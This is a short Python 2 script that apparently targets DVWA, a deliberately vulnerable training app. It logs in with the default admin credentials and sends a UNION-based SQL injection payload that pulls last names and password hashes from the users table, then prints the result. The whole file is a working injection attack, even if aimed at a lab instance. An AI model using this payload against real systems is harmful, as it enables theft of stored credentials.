#from BeautifulSoup import BeautifulSoup
import urllib
import urllib2
import cookielib
import mutator

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

opener.addheaders = [('User-agent', 'DVWATesting')]
urllib2.install_opener(opener)
authentication_url = "http://192.168.2.2/DVWA/login.php"
sql_url = "http://192.168.2.2/DVWA/vulnerabilities/sqli/?"
login_params = {
               "username" : "admin",
               "password" : "password",
               "Login": "Login"
              }
login_args = urllib.urlencode(login_params)

req = urllib2.Request(authentication_url, login_args)

resp = urllib2.urlopen(req)
contents = resp.read()

sql_params = {
              "id" : "1' UNION select last_name, password from users;#",
              "Submit" : "Submit"
}
sql_args = urllib.urlencode(sql_params)

req = urllib2.Request(sql_url + sql_args + '#')
resp = urllib2.urlopen(req)
contents = resp.read()
print(contents)

